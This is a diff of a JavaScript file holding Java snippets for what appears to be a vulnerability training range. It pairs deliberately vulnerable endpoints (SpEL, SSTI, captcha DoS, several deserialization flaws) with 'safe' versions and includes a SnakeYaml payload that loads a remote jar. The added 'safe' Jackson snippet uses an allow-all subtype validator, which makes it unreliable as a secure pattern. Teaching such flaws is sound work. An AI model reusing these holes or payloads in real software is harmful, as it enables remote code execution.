@@ -1301,6 +1301,20 @@ const safeJSONP = "// 校验回调函数名是否合法\n" +
     "    return;\n" +
     "}"
 
+const vulDos = "public void vul(@RequestParam Integer width, @RequestParam Integer height, HttpServletResponse response) throws IOException {\n" +
+    "    response.setContentType(\"image/jpeg\");\n" +
+    "    response.setHeader(\"Pragma\", \"no-cache\");\n" +
+    "    response.setHeader(\"Cache-Control\", \"no-cache\");\n" +
+    "    // 验证码参数可控 造成拒绝服务攻击\n" +
+    "    ShearCaptcha shearCaptcha = CaptchaUtil.createShearCaptcha(width, height,4,3);\n" +
+    "    try {\n" +
+    "        shearCaptcha.write(response.getOutputStream());\n" +
+    "    } catch (IOException e) {\n" +
+    "        throw new RuntimeException(e);\n" +
+    "    }\n" +
+    "}"
+const vul2Dos = ""
+
 // js泄漏-硬编码
 const hardCoding = "function login() {\n" +
     "    // 硬编码的用户名和密码\n" +
@@ -1484,7 +1498,7 @@ const infoLeakCeShi = "@GetMapping(\"/ping\")\n" +
     "}";
 
 // java专题 SPEL注入
-const spelVul = "public R spelVul(@ApiParam(name = \"ex\", value = \"表达式\", required = true) @RequestParam String ex) {\n" +
+const spelVul = "public R vul(@ApiParam(name = \"ex\", value = \"表达式\", required = true) @RequestParam String ex) {\n" +
     "    // 创建SpEL解析器，ExpressionParser接口用于表示解析器，SpelExpressionParser为默认实现\n" +
     "    ExpressionParser parser = new SpelExpressionParser();\n" +
     "    \n" +
@@ -1502,7 +1516,7 @@ const spelVul = "public R spelVul(@ApiParam(name = \"ex\", value = \"表达式\"
     "    return R.ok(result);\n" +
     "}"
 
-const spelSafe = "public R spelSafe(@ApiParam(name = \"ex\", value = \"表达式\", required = true) @RequestParam String ex) {\n" +
+const spelSafe = "public R safe(@ApiParam(name = \"ex\", value = \"表达式\", required = true) @RequestParam String ex) {\n" +
     "    ExpressionParser parser = new SpelExpressionParser();\n" +
     "    \n" +
     "\t// 使用 SimpleEvaluationContext 限制表达式功能(Java类型引用、构造函数调用、Bean引用)，防止危险的操作\n" +
@@ -1514,15 +1528,16 @@ const spelSafe = "public R spelSafe(@ApiParam(name = \"ex\", value = \"表达式
     "    return R.ok(result);\n" +
     "}"
 
-const sstiVul = "public String sstiVul(@ApiParam(name = \"para\", value = \"用户输入参数\", required = true) @RequestParam String para, Model model) {\n" +
+const sstiVul = "public String vul1(@ApiParam(name = \"para\", value = \"用户输入参数\", required = true) @RequestParam String para, Model model) {\n" +
     "    // 用户输入直接拼接到模板路径，可能导致SSTI（服务器端模板注入）漏洞\n" +
     "    return \"/vul/ssti/\" + para;\n" +
     "}\n" +
     "\n" +
-    "public void sstiVul2(@PathVariable String path) {\n" +
+    "public void vul2(@PathVariable String path) {\n" +
     "    log.info(\"SSTI注入：\"+path);\n" +
     "}\n" +
     "\n" +
+    "\t// 缺陷组件版本参考\n" +
     "<parent>\n" +
     "    <groupId>org.springframework.boot</groupId>\n" +
     "    <artifactId>spring-boot-starter-parent</artifactId>\n" +
@@ -1537,7 +1552,7 @@ const sstiVul = "public String sstiVul(@ApiParam(name = \"para\", value = \"用�
     "    <version>2.4.1</version>\n" +
     "</dependency>\n"
 const sstiSafe = "@GetMapping(\"/safe-thymeleaf\")\n" +
-    "public String sstiSafe(@ApiParam(name = \"para\", value = \"用户输入参数\", required = true) @RequestParam String para, Model model) {\n" +
+    "public String safe1(@ApiParam(name = \"para\", value = \"用户输入参数\", required = true) @RequestParam String para, Model model) {\n" +
     "    List<String> white_list = new ArrayList<>(Arrays.asList(\"vul\", \"ssti\"));\n" +
     "    if (white_list.contains(para)){\n" +
     "        return \"vul/ssti\" + para;\n" +
@@ -1546,13 +1561,11 @@ const sstiSafe = "@GetMapping(\"/safe-thymeleaf\")\n" +
     "    }\n" +
     "}\n" +
     "@GetMapping(\"/safe2/{path}\")\n" +
-    "public void sstiSafe2(@PathVariable String path, HttpServletResponse response) {\n" +
+    "public void safe2(@PathVariable String path, HttpServletResponse response) {\n" +
     "    log.info(\"SSTI注入：\"+path);\n" +
     "}"
 
-const vulReadObject = "@RequestMapping(\"/vulReadObject\")\n" +
-    "@ResponseBody\n" +
-    "public R vulReadObject(String payload) {\n" +
+const vulReadObject = "public R vul(String payload) {\n" +
     "    try {\n" +
     "        payload = payload.replace(\" \", \"+\");\n" +
     "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
@@ -1565,9 +1578,7 @@ const vulReadObject = "@RequestMapping(\"/vulReadObject\")\n" +
     "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
     "    }\n" +
     "}"
-const safeReadObject1 = "@RequestMapping(\"/safeReadObject1\")\n" +
-    "@ResponseBody\n" +
-    "public R safeReadObject1(String payload) {\n" +
+const safeReadObject1 = "public R safe1(String payload) {\n" +
     "    // 安全措施：禁用不安全的反序列化\n" +
     "    System.setProperty(\"org.apache.commons.collections.enableUnsafeSerialization\", \"false\");\n" +
     "    try {\n" +
@@ -1582,9 +1593,7 @@ const safeReadObject1 = "@RequestMapping(\"/safeReadObject1\")\n" +
     "        return R.error(\"[-]请输入正确的Payload！\\n\"+e.getMessage());\n" +
     "    }\n" +
     "}"
-const safeReadObject2 = "@RequestMapping(\"/safeReadObject2\")\n" +
-    "@ResponseBody\n" +
-    "public R safeReadObject2(String payload) {\n" +
+const safeReadObject2 = "public R safe2(String payload) {\n" +
     "    try {\n" +
     "        payload = payload.replace(\" \", \"+\");\n" +
     "        byte[] bytes = Base64.getDecoder().decode(payload);\n" +
@@ -1604,30 +1613,25 @@ const safeReadObject2 = "@RequestMapping(\"/safeReadObject2\")\n" +
     "}"
 const safeReadObject3 = "safeReadObject3"
 
-const vulSnakeYaml = "@PostMapping(\"/vulSnakeYaml\")\n" +
-    "@ResponseBody\n" +
-    "public R vulSnakeYaml(String payload) {\n" +
+const vulSnakeYaml = "public R vul(String payload) {\n" +
     "    Yaml y = new Yaml();\n" +
     "    y.load(payload);\n" +
     "    return R.ok(\"[+]Java反序列化：SnakeYaml\");\n" +
     "}\n" +
     "\n" +
-    "payload示例：\n" +
-    "payload=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:7777/yaml-payload.jar']]]]"
-const safeSnakeYaml = "@PostMapping(\"/safeSnakeYaml\")\n" +
-    "public R safeSnakeYaml(String payload) {\n" +
+    "// payload示例\n" +
+    "payload=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:7777/yaml-payload.jar']]]]\n"
+const safeSnakeYaml = "public R safe(String payload) {\n" +
     "    try {\n" +
     "        Yaml y = new Yaml(new SafeConstructor());\n" +
     "        y.load(payload);\n" +
-    "        return R.ok(\"[-]Java反序列化：SnakeYaml安全构造\");\n" +
+    "        return R.ok(\"[+]Java反序列化：SnakeYaml安全构造\");\n" +
     "    } catch (Exception e) {\n" +
     "        return R.error(\"[-]Java反序列化：SnakeYaml反序列化失败\");\n" +
     "    }\n" +
     "}"
 
-
-const vulXmlDecoder = '@RequestMapping("/vulXmlDecoder")\n' +
-    'public R vulXmlDecoder(String payload) {\n' +
+const vulXmlDecoder = 'public R vul(String payload) {\n' +
     '    String[] strCmd = payload.split(" ");\n' +
     '    StringBuilder xml = new StringBuilder()\n' +
     '            .append("<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>")\n' +
@@ -1648,7 +1652,26 @@ const vulXmlDecoder = '@RequestMapping("/vulXmlDecoder")\n' +
     '    }\n' +
     '}'
 
-const safeXmlDecoder = "vulXmlDecoder"
+const safeXmlDecoder = 'public R safe(@RequestParam String payload) {\n' +
+    '    try {\n' +
+    '        // 构建 XML 字符串\n' +
+    '        ...\n' +
+    '        // 使用 SAX 解析器解析 XML\n' +
+    '        SAXParserFactory factory = SAXParserFactory.newInstance();\n' +
+    '        SAXParser saxParser = factory.newSAXParser();\n' +
+    '        CommandHandler handler = new CommandHandler();\n' +
+    '        // 将 ByteArrayInputStream 包装成 InputSource\n' +
+    '        InputSource inputSource = new InputSource(new ByteArrayInputStream(xml.toString().getBytes(StandardCharsets.UTF_8)));\n' +
+    '        saxParser.parse(inputSource, handler);\n' +
+    '        // 获取解析后的命令参数\n' +
+    '        List<String> args = handler.getArgs();\n' +
+    '        // 处理解析后的命令参数\n' +
+    '        System.out.println("Parsed command: " + String.join(" ", args));\n' +
+    '        return R.ok("[+]命令解析成功:"+String.join(" ", args));\n' +
+    '    } catch (Exception e) {\n' +
+    '        return R.error("[-]命令解析失败: " + e.getMessage());\n' +
+    '    }\n' +
+    '}'
 
 const vulFastjson = "@PostMapping(\"/vul\")\n" +
     "@ResponseBody\n" +
@@ -1689,6 +1712,43 @@ const safeFastjson = "@PostMapping(\"/safe\")\n" +
     "    <artifactId>fastjson</artifactId>\n" +
     "    <version>1.2.83版本以上</version>\n" +
     "</dependency>"
+
+const vulJackson = "@RequestMapping(\"/vul\")\n" +
+    "public String vul(@RequestBody String content) {\n" +
+    "    try {\n" +
+    "        ObjectMapper mapper = new ObjectMapper();\n" +
+    "        mapper.enableDefaultTyping(); // 启用多态类型处理\n" +
+    "\n" +
+    "        // 反序列化接收的JSON数据，触发漏洞\n" +
+    "        Object obj = mapper.readValue(content, Object.class);\n" +
+    "        return \"[+]Jackson 反序列化: \" + obj.toString();\n" +
+    "    } catch (Exception e) {\n" +
+    "        e.printStackTrace();\n" +
+    "        return \"[-]Jackson反序列化失败\";\n" +
+    "    }\n" +
+    "}"
+
+const safeJackson = "@PostMapping(\"/safe\")\n" +
+    "@ResponseBody\n" +
+    "public String safeJackson(@RequestBody String payload) {\n" +
+    "    try {\n" +
+    "        ObjectMapper mapper = new ObjectMapper();\n" +
+    "\n" +
+    "        // 启用安全的类型验证\n" +
+    "        mapper.activateDefaultTyping(\n" +
+    "                LaissezFaireSubTypeValidator.instance,\n" +
+    "                ObjectMapper.DefaultTyping.NON_FINAL\n" +
+    "        );\n" +
+    "        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);\n" +
+    "\n" +
+    "        // 反序列化传入的JSON数据\n" +
+    "        Map<String, Object> safePayload = mapper.readValue(payload, Map.class);\n" +
+    "        return mapper.writeValueAsString(safePayload);\n" +
+    "    } catch (Exception e) {\n" +
+    "        e.printStackTrace();\n" +
+    "        return \"Jackson Safe Deserialization Error\";\n" +
+    "    }\n" +
+    "}"
 
 const vulXstream = "@RequestMapping(\"/vul\")\n" +
     "@ResponseBody\n" +
